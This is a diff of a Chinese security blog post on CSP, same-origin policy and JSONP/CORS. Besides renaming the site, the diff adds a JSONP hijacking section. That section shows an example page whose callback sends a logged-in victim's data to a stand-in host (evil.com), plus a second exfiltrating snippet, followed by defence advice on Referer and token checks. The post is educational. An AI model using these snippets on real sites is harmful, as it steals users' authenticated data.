@@ -20,10 +20,10 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="前端安全之CSP、同源策略与跨域请求(JSONP&#x2F;CROS)">
 <meta property="og:url" content="0sec.com.cn/2018-12-22/index.html">
-<meta property="og:site_name" content="0sec">
+<meta property="og:site_name" content="Cosmic Fragments">
 <meta property="og:description" content="‮">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-23T06:13:14.055Z">
+<meta property="og:updated_time" content="2019-03-25T05:28:31.029Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="前端安全之CSP、同源策略与跨域请求(JSONP&#x2F;CROS)">
 <meta name="twitter:description" content="‮">
@@ -31,7 +31,7 @@
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
 
-    <link rel="alternate" href="/atom.xml" title="0sec" type="application/atom+xml">
+    <link rel="alternate" href="/atom.xml" title="Cosmic Fragments" type="application/atom+xml">
 
 
 
@@ -58,7 +58,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>前端安全之CSP、同源策略与跨域请求(JSONP/CROS) | 0sec</title>
+<title>前端安全之CSP、同源策略与跨域请求(JSONP/CROS) | Cosmic Fragments</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -115,7 +115,7 @@
         </hgroup>
 
         
-        <p class="header-subtitle">不能改变的洞察毫无意义</p>
+        <p class="header-subtitle">我们大多数人并不真正聪明，只是擅长记忆聪明人说过的话语</p>
         
 
         
@@ -188,7 +188,7 @@
               <h1 class="header-author"><a href="/" title="回到主页">Fazx</a></h1>
             </hgroup>
             
-            <p class="header-subtitle">不能改变的洞察毫无意义</p>
+            <p class="header-subtitle">我们大多数人并不真正聪明，只是擅长记忆聪明人说过的话语</p>
             
             <nav class="header-menu">
                 <ul>
@@ -364,6 +364,43 @@ ACCESS-CONTROL-ALLOW-ORIGIN:* 允许所有域名脚本访问
 </blockquote>
 <p>ajax也可以跨域，jsonp也可以同域，两者的区别不在是否跨域。而jsonp也不一定非要传递json格式的数据。</p>
 <p><strong>JSONP只支持get请求</strong>。</p>
+<h3 id="JSONP-Hijacking-jsonp劫持"><a href="#JSONP-Hijacking-jsonp劫持" class="headerlink" title="JSONP Hijacking(jsonp劫持)"></a>JSONP Hijacking(jsonp劫持)</h3><p>简单地说，JSONP是一种跨域数据获取的方式，核心就是用callback回调函数传递数据，前端定义的函数在后端完成调用然后回到前端执行。</p>
+<p>攻击样例：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
+    function hijack(result) { 
+        var data = '';
+        for(var i in result) {
+            data += i + ':' + result[i];
+        }
+        new Image().src = "http://www.evil.com/JSONHiJacking.php?data=" + escape(data);//把数据发送到攻击者服务器上
+    } 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://crossdomain.com/services.php?callback<span class="token punctuation">=</span>hijack<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>代码很直观，用户在带有身份认证信息时访问页面，触发回调函数，将获取的数据传递到evil服务器上，这个流程也就完全符合了CSRF的攻击原理，因此也将这种JSONP的劫持归为CSRF的一种。</p>
+<p>又比如：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
+    var xmlhttp;
+    function jsonppp(a)
+    {
+    xmlhttp=new XMLHttpRequest()
+    var x="http://***.***.***/json.php?name="+a.data.name;
+    xmlhttp.open("GET", x, true);
+    xmlhttp.send();
+    }
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+&lt;script src=http://***.***.***?callback=jsonppp><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>代码都是大同小异，原理也比较简单，但是在防御上还是有一些值得注意的地方:</p>
+<h4 id="防御且防止绕过"><a href="#防御且防止绕过" class="headerlink" title="防御且防止绕过"></a>防御且防止绕过</h4><h5 id="校验Referer，验证数据调用来源"><a href="#校验Referer，验证数据调用来源" class="headerlink" title="校验Referer，验证数据调用来源"></a>校验Referer，验证数据调用来源</h5><p>思路很直观，但是在实际校验时容易出现问题，攻击者可以构造<strong>子域名</strong>的URL来绕过正则的校验；或者，当<strong>跨协议调用js</strong>时，http请求中的<strong>Referer是空的</strong>，这一点很容易被遗漏。此外，XSS漏洞也可能导致空Referer。</p>
+<h5 id="增加Token验证"><a href="#增加Token验证" class="headerlink" title="增加Token验证"></a>增加Token验证</h5><ul>
+<li>要保证Token的复杂性，防止被爆破；</li>
+<li>Token如果作为GET请求的参数，很容易在Referer中泄露；</li>
+<li>结合同域下的XSS漏洞可能获取到Token。</li>
+</ul>
 <h3 id="CROS（Cross-origin-resource-sharing）"><a href="#CROS（Cross-origin-resource-sharing）" class="headerlink" title="CROS（Cross-origin resource sharing）"></a>CROS（Cross-origin resource sharing）</h3><p>CROS由浏览器自动完成，在开发时与AJAX代码完全一样。只要服务器支持CORS就可以实现。浏览器一旦发现AJAX请求跨源，会添加额外的HTTP头。</p>
 <p>CROS请求分为简单请求和非简单请求，简单请求的条件是:</p>
 <pre><code>（1) 请求方法是以下三种方法之一：
@@ -416,7 +453,7 @@ ACCESS-CONTROL-ALLOW-ORIGIN:* 允许所有域名脚本访问
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内容安全策略-Content-Security-Policy，CSP"><span class="toc-number">1.</span> <span class="toc-text">内容安全策略(Content-Security-Policy，CSP)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP是…"><span class="toc-number">1.1.</span> <span class="toc-text">CSP是…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#示例"><span class="toc-number">1.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP绕过"><span class="toc-number">1.3.</span> <span class="toc-text">CSP绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同源"><span class="toc-number">2.</span> <span class="toc-text">同源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#跨域请求"><span class="toc-number">3.</span> <span class="toc-text">跨域请求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-JSON-with-Padding"><span class="toc-number">3.1.</span> <span class="toc-text">JSONP(JSON with Padding)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CROS（Cross-origin-resource-sharing）"><span class="toc-number">3.2.</span> <span class="toc-text">CROS（Cross-origin resource sharing）</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内容安全策略-Content-Security-Policy，CSP"><span class="toc-number">1.</span> <span class="toc-text">内容安全策略(Content-Security-Policy，CSP)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP是…"><span class="toc-number">1.1.</span> <span class="toc-text">CSP是…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#示例"><span class="toc-number">1.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP绕过"><span class="toc-number">1.3.</span> <span class="toc-text">CSP绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同源"><span class="toc-number">2.</span> <span class="toc-text">同源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#跨域请求"><span class="toc-number">3.</span> <span class="toc-text">跨域请求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-JSON-with-Padding"><span class="toc-number">3.1.</span> <span class="toc-text">JSONP(JSON with Padding)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-Hijacking-jsonp劫持"><span class="toc-number">3.2.</span> <span class="toc-text">JSONP Hijacking(jsonp劫持)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#防御且防止绕过"><span class="toc-number">3.2.1.</span> <span class="toc-text">防御且防止绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#校验Referer，验证数据调用来源"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">校验Referer，验证数据调用来源</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#增加Token验证"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">增加Token验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CROS（Cross-origin-resource-sharing）"><span class="toc-number">3.3.</span> <span class="toc-text">CROS（Cross-origin resource sharing）</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -452,7 +489,7 @@ ACCESS-CONTROL-ALLOW-ORIGIN:* 允许所有域名脚本访问
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"前端安全之CSP、同源策略与跨域请求(JSONP/CROS)　| 0sec　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"前端安全之CSP、同源策略与跨域请求(JSONP/CROS)　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -486,7 +523,7 @@ ACCESS-CONTROL-ALLOW-ORIGIN:* 允许所有域名脚本访问
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019-03-20/">WordPress 5.1.1 CSRF to RCE 跟进分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-02-15/">XML外部实体注入(XXE攻击)小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-01-26/">Django开发小记 & Docker笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-22/">前端安全之CSP、同源策略与跨域请求(JSONP/CROS)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-01/">使用Aircrack-ng破解WPA2协议无线网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-11-11/">PHP博客管理系统开发全记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-10-10/">环境配置记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-30/">区块链基础[待补充]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-05/">校园网免流攻略(基于逻辑漏洞、DNS伪装包或IPv6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-07-11/">基于Scrapy-Redis框架与Mongodb的分布式爬虫-elasticsearch搜索引擎打造</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-26/">《渗透测试实践指南》阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-16/">「Web向」XCTF联赛2018年度考点知识总结-持续更新</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-14/">「娱乐向」一些安全小技巧在生活中的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-12/">从一道取证题目谈NTFS交换数据流</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-10/">关于Xdebug的那些事儿</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-26/">PHP弱类型&&md5碰撞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-24/">Hello World</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019-02-15/">XML外部实体注入(XXE攻击)小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019-01-26/">Django开发小记 & Docker笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-22/">前端安全之CSP、同源策略与跨域请求(JSONP/CROS)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-12-01/">使用Aircrack-ng破解WPA2协议无线网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-11-11/">PHP博客管理系统开发全记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-10-10/">环境配置记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-30/">区块链基础[待补充]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-08-05/">校园网免流攻略(基于逻辑漏洞、DNS伪装包或IPv6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-07-11/">基于Scrapy-Redis框架与Mongodb的分布式爬虫-elasticsearch搜索引擎打造</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-26/">《渗透测试实践指南》阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-16/">「Web向」XCTF联赛2018年度考点知识总结-持续更新</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-14/">「娱乐向」一些安全小技巧在生活中的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-12/">从一道取证题目谈NTFS交换数据流</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-05-10/">关于Xdebug的那些事儿</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-26/">PHP弱类型&&md5碰撞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018-04-24/">Hello World</a></li></ul>
 
 
 
